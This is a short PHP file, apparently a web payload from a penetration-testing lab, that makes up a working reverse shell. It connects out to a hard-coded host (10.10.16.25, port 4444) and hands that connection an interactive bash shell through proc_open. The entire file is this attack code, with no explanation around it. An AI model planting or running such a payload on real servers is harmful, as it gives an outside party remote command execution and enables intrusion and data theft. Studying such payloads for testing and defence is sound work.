<?php

$lhost = "10.10.16.25";
$lport = 4444;

$sock = fsockopen($lhost, $lport);
$proc = proc_open("/bin/bash -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);

?>
